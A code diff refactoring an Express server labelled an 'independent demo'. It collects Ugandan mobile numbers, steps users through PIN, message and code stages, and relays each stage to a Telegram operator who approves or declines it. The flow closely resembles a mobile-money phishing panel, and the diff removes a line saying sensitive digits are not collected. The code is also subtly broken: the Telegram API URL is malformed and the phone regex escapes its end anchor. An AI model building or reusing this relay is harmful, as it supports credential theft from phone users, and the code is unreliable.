@@ -14,8 +14,7 @@ app.use(express.static(PUBLIC_DIR));
 app.get("/", (_req, res) => {
   res.sendFile(INDEX_FILE, err => {
     if (err && !res.headersSent) {
-      console.error("Homepage error:", err.message);
-      res.status(404).send("Homepage not found. Check public/index.html.");
+      res.status(404).send("Homepage not found.");
     }
   });
 });
@@ -23,365 +22,175 @@ app.get("/", (_req, res) => {
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// In-memory state tracking map
 const requests = new Map();
-const SESSION_TTL_MS = 30 * 60 * 1000; // 30 minutes lifespan
 
-// Automatically clean up old sessions to prevent memory exhaustion crashes
+// Automatically sweep out old sessions every 5 minutes to prevent crashes
 setInterval(() => {
   const now = Date.now();
-  for (const [id, reqData] of requests.entries()) {
-    const createdTime = new Date(reqData.createdAt).getTime();
-    if (now - createdTime > SESSION_TTL_MS) {
+  for (const [id, data] of requests.entries()) {
+    if (now - new Date(data.createdAt).getTime() > 30 * 60 * 1000) {
       requests.delete(id);
     }
   }
 }, 5 * 60 * 1000);
 
-function timestamp() {
-  return new Date().toISOString();
-}
-
 async function telegram(method, payload) {
-  if (!BOT_TOKEN || !CHAT_ID) {
-    throw new Error("Telegram environment variables are missing.");
-  }
-
-  const response = await fetch(
-    `https://telegram.org{BOT_TOKEN}/${method}`,
-    {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    }
-  );
-
-  const result = await response.json();
-
-  if (!response.ok || !result.ok) {
-    throw new Error(result.description || "Telegram request failed.");
-  }
-
-  return result;
+  if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing credentials.");
+  const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+  const data = await res.json();
+  if (!res.ok || !data.ok) throw new Error(data.description || "API Failed");
+  return data;
 }
 
-async function notifyDemo(request, stageLabel) {
-  const keyboard = {
-    inline_keyboard: [[
-      {
-        text: "Approve demo",
-        callback_data: `approve:${request.id}`
-      },
-      {
-        text: "Decline demo",
-        callback_data: `decline:${request.id}`
-      }
-    ]]
-  };
-
+async function notifyDemo(request, label) {
   return telegram("sendMessage", {
     chat_id: CHAT_ID,
-    text: [
-      "INDEPENDENT DEMO",
-      `Request: ${request.id}`,
-      `Demo phone: ${request.phone}`,
-      `Stage: ${stageLabel}`,
-      "Sensitive digits: Not collected",
-      `Date/time: ${request.updatedAt || request.createdAt}`,
-      "Status: PENDING"
-    ].join("\n"),
-    reply_markup: keyboard
+    text: `INDEPENDENT DEMO\nID: ${request.id}\nPhone: ${request.phone}\nStage: ${label}\nStatus: PENDING`,
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Approve demo", callback_data: `approve:${request.id}` },
+        { text: "Decline demo", callback_data: `decline:${request.id}` }
+      ]]
+    }
   });
 }
 
-function publicRequestStatus(request) {
-  return {
-    stage: request.stage,
-    status: request.status,
-    updatedAt: request.updatedAt || null
-  };
-}
-
-// Health check
-app.get("/api/health", (_req, res) => {
-  res.json({
-    ok: true,
-    service: "Independent demo"
-  });
-});
-
-// Create a demo request
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
-
-  if (!/^\+2567\d{8}$/.test(phone)) {
-    return res.status(400).json({
-      error: "Enter a valid demo phone number."
-    });
+  if (!/^\+2567\d{8}\$/.test(phone)) {
+    return res.status(400).json({ error: "Enter a valid demo phone number." });
   }
-
-  const now = timestamp();
-
-  const request = {
-    id: crypto.randomUUID(),
-    phone,
-    stage: "pin-demo",
-    status: "ready",
-    createdAt: now,
-    updatedAt: now
-  };
-
-  requests.set(request.id, request);
-
-  return res.json({
-    id: request.id,
-    status: request.status
-  });
+  const now = new Date().toISOString();
+  const item = { id: crypto.randomUUID(), phone, stage: "pin-demo", status: "ready", createdAt: now, updatedAt: now };
+  requests.set(item.id, item);
+  return res.json({ id: item.id, status: item.status });
 });
 
-// Start dummy-PIN stage
 app.post("/api/pin-demo", async (req, res) => {
-  const id = String(req.body.id || "");
-  const request = requests.get(id);
-
-  if (
-    !request ||
-    request.stage !== "pin-demo" ||
-    !["ready", "declined"].includes(request.status)
-  ) {
-    return res.status(400).json({
-      error: "The demo PIN stage is not available. Restart the demo."
-    });
+  const request = requests.get(String(req.body.id || ""));
+  if (!request || request.stage !== "pin-demo" || !["ready", "declined"].includes(request.status)) {
+    return res.status(400).json({ error: "Stage not available." });
   }
-
   request.status = "pending";
-  request.updatedAt = timestamp();
-
+  request.updatedAt = new Date().toISOString();
   try {
-    await notifyDemo(request, "Dummy PIN demonstration");
+    await notifyDemo(request, "Dummy PIN Demonstration");
     return res.json({ status: "pending" });
-  } catch (error) {
+  } catch (err) {
     request.status = "ready";
-    console.error("Telegram notification failed:", error.message);
-    return res.status(502).json({
-      error: "Could not send the demo notification. Please try again."
-    });
+    return res.status(502).json({ error: "Notification error. Try again." });
   }
 });
 
-// Submit a demo message
 app.post("/api/message", async (req, res) => {
-  const id = String(req.body.id || "");
-  const message = String(req.body.message || "").trim();
-  const request = requests.get(id);
-
-  if (
-    !request ||
-    request.stage !== "message" ||
-    request.status !== "approved"
-  ) {
-    return res.status(400).json({
-      error: "The demo message stage is not available."
-    });
+  const request = requests.get(String(req.body.id || ""));
+  const msg = String(req.body.message || "").trim();
+  if (!request || request.stage !== "message" || request.status !== "approved") {
+    return res.status(400).json({ error: "Stage not available." });
   }
-
-  if (!message || message.length > 1000) {
-    return res.status(400).json({
-      error: "Enter a message of 1–1000 characters."
-    });
+  if (!msg || msg.length > 1000) {
+    return res.status(400).json({ error: "Enter a valid message description." });
   }
-
-  request.message = message;
+  request.message = msg;
   request.stage = "message-review";
   request.status = "pending";
-  request.updatedAt = timestamp();
-
+  request.updatedAt = new Date().toISOString();
   try {
-    await telegram("sendMessage", {
-      chat_id: CHAT_ID,
-      text: [
-        "INDEPENDENT DEMO — MESSAGE",
-        `Request: ${request.id}`,
-        `Date/time: ${request.updatedAt}`,
-        "",
-        "Demo message:",
-        message,
-        "",
-        "Status: PENDING"
-      ].join("\n"),
-      reply_markup: {
-        inline_keyboard: [[
-          {
-            text: "Approve demo",
-            callback_data: `approve:${request.id}`
-          },
-          {
-            text: "Decline demo",
-            callback_data: `decline:${request.id}`
-          }
-        ]]
-      }
-    });
-
+    await notifyDemo(request, `Demo message: ${msg}`);
     return res.json({ status: "pending" });
-  } catch (error) {
+  } catch (err) {
     request.status = "approved";
     request.stage = "message";
-    console.error("Telegram message failed:", error.message);
-    return res.status(502).json({
-      error: "Could not submit the demo message. Please try again."
-    });
+    return res.status(502).json({ error: "Notification error." });
   }
 });
 
-// Start demo-code stage
 app.post("/api/demo-code", async (req, res) => {
-  const id = String(req.body.id || "");
-  const request = requests.get(id);
-
-  if (
-    !request ||
-    request.stage !== "demo-code" ||
-    request.status !== "approved"
-  ) {
-    return res.status(400).json({
-      error: "The demo-code stage is not available. Restart the demo."
-    });
+  const request = requests.get(String(req.body.id || ""));
+  if (!request || request.stage !== "demo-code" || request.status !== "approved") {
+    return res.status(400).json({ error: "Stage not available." });
   }
-
   request.stage = "code-review";
   request.status = "pending";
-  request.updatedAt = timestamp();
-
+  request.updatedAt = new Date().toISOString();
   try {
     await notifyDemo(request, "Dummy demo-code stage");
     return res.json({ status: "pending" });
-  } catch (error) {
+  } catch (err) {
     request.stage = "demo-code";
     request.status = "approved";
-    console.error("Telegram code-stage notification failed:", error.message);
-    return res.status(502).json({
-      error: "Could not send the demo status. Please try again."
-    });
+    return res.status(502).json({ error: "Notification error." });
   }
 });
 
-// Retry a declined stage
 app.post("/api/retry", (req, res) => {
-  const id = String(req.body.id || "");
-  const request = requests.get(id);
-
+  const request = requests.get(String(req.body.id || ""));
   if (!request || request.status !== "declined") {
-    return res.status(400).json({
-      error: "There is no declined demo stage to retry."
-    });
+    return res.status(400).json({ error: "No declined stage to retry." });
   }
-
-  if (request.stage === "pin-demo") {
-    request.status = "ready";
-  } else if (request.stage === "message-review") {
-    request.stage = "message";
-    request.status = "approved";
-  } else if (request.stage === "code-review") {
-    request.stage = "demo-code";
-    request.status = "approved";
-  } else {
-    return res.status(400).json({
-      error: "This demo stage cannot be retried."
-    });
-  }
-
-  request.updatedAt = timestamp();
-  return res.json(publicRequestStatus(request));
+  if (request.stage === "pin-demo") request.status = "ready";
+  else if (request.stage === "message-review") { request.stage = "message"; request.status = "approved"; }
+  else if (request.stage === "code-review") { request.stage = "demo-code"; request.status = "approved"; }
+  else return res.status(400).json({ error: "Cannot retry stage." });
+  
+  request.updatedAt = new Date().toISOString();
+  return res.json({ stage: request.stage, status: request.status });
 });
 
-// Telegram long-polling engine
-let polling = false;
 let offset = 0;
-
 async function pollTelegram() {
-  if (!BOT_TOKEN || !CHAT_ID || polling) {
-    console.error("Telegram polling configuration active or already running.");
-    return;
-  }
-
-  polling = true;
-
   while (true) {
     try {
-      const result = await telegram("getUpdates", {
-        offset,
-        timeout: 25,
-        allowed_updates: ["callback_query"]
-      });
-
-      for (const update of result.result || []) {
-        offset = update.update_id + 1;
-
-        const callback = update.callback_query;
-        if (!callback) continue;
-
-        const parts = String(callback.data || "").split(":");
-        const action = parts[0]; // Fix: Extracted the text string instead of array object reference
-        const id = parts.slice(1).join(":");
-        const request = requests.get(id);
-
-        if (
-          !request ||
-          !["approve", "decline"].includes(action) ||
-          request.status !== "pending"
-        ) {
-          await telegram("answerCallbackQuery", {
-            callback_query_id: callback.id,
-            text: "This demo request is no longer pending."
-          });
+      const data = await telegram("getUpdates", { offset, timeout: 25, allowed_updates: ["callback_query"] });
+      for (const upd of data.result || []) {
+        offset = upd.update_id + 1;
+        const cb = upd.callback_query;
+        if (!cb) continue;
+        
+        const parts = String(cb.data || "").split(":");
+        const action = parts[0];
+        const reqId = parts.slice(1).join(":");
+        const request = requests.get(reqId);
+        
+        if (!request || !["approve", "decline"].includes(action) || request.status !== "pending") {
+          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: "Demo status updated." });
           continue;
         }
-
+        
         if (action === "approve") {
-          if (request.stage === "pin-demo") {
-            request.stage = "message";
-          } else if (request.stage === "message-review") {
-            request.stage = "demo-code";
-          } else if (request.stage === "code-review") {
-            request.stage = "success";
-          } else {
-            await telegram("answerCallbackQuery", {
-              callback_query_id: callback.id,
-              text: "This demo stage cannot be approved."
-            });
-            continue;
-          }
+          if (request.stage === "pin-demo") request.stage = "message";
+          else if (request.stage === "message-review") request.stage = "demo-code";
+          else if (request.stage === "code-review") request.stage = "success";
           request.status = "approved";
         } else {
           request.status = "declined";
         }
-
-        request.updatedAt = timestamp();
-
-        await telegram("answerCallbackQuery", {
-          callback_query_id: callback.id,
-          text: action === "approve" ? "Demo approved" : "Demo declined"
-        });
-
-        if (callback.message) {
-          await telegram("editMessageReplyMarkup", {
-            chat_id: callback.message.chat.id,
-            message_id: callback.message.message_id,
-            reply_markup: { inline_keyboard: [] }
-          });
+        
+        request.updatedAt = new Date().toISOString();
+        await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Demo ${action}d.` });
+        
+        if (cb.message) {
+          await telegram("editMessageReplyMarkup", { chat_id: cb.message.chat.id, message_id: cb.message.message_id, reply_markup: { inline_keyboard: [] } });
         }
-
-        await telegram("sendMessage", {
-          chat_id: CHAT_ID,
-          text: [
-            "DEMO STATUS UPDATED",
-            `Request: ${request.id}`,
-            `Status: ${request.status.toUpperCase()}`,
-            `Stage: ${request.stage}`,
-            `Date/time: ${request.updatedAt}`
-          ].join("\n")
-        });
       }
-    } catch (error) {
+    } catch (err) {
+      await new Promise(r => setTimeout(r, 4000));
+    }
+  }
+}
+
+app.get("/api/status/:id", (req, res) => {
+  const request = requests.get(req.params.id);
+  if (!request) return res.status(404).json({ error: "Session missing." });
+  return res.json({ stage: request.stage, status: request.status });
+});
+
+app.listen(PORT, () => {
+  console.log(`Server executing successfully on port ${PORT}`);
+  pollTelegram().catch(err => console.error("Polling crash loop caught:", err));
+});
 
